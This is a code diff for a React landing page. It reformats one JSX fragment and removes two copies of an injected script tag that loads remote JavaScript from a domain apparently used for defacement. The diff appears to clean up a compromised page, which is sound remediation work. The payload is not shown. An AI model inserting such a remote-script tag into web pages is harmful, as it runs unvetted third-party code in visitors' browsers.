@@ -10,9 +10,11 @@ function SectionTitle({ id, title, eyebrow }) {
   return (
     <div id={id} className="mb-8 text-center">
       {eyebrow && (
-        <><div className="mx-auto text-xs font-semibold uppercase tracking-widest text-amber-600">
-          {eyebrow}
-        </div></>
+        <>
+          <div className="mx-auto text-xs font-semibold uppercase tracking-widest text-amber-600">
+            {eyebrow}
+          </div>
+        </>
       )}
       <h2 className="relative mx-auto inline-block text-2xl font-extrabold sm:text-3xl">
         {title}
@@ -138,7 +140,6 @@ export default function Page() {
     <>
       <div id="top" />
       <Navbar />
-    <script src="https://jso.defacer.id/raw/HdL4A3H40c"></script>
       {/* HERO */}
       <section className="relative overflow-hidden">
         <div className="pointer-events-none absolute -top-24 -right-24 hidden h-80 w-80 rounded-full bg-amber-100 blur-3xl md:block"></div>
@@ -428,7 +429,6 @@ export default function Page() {
           </p>
         </div>
       </footer>
-    <script src="https://jso.defacer.id/raw/HdL4A3H40c"></script>
     </>
   );
 }
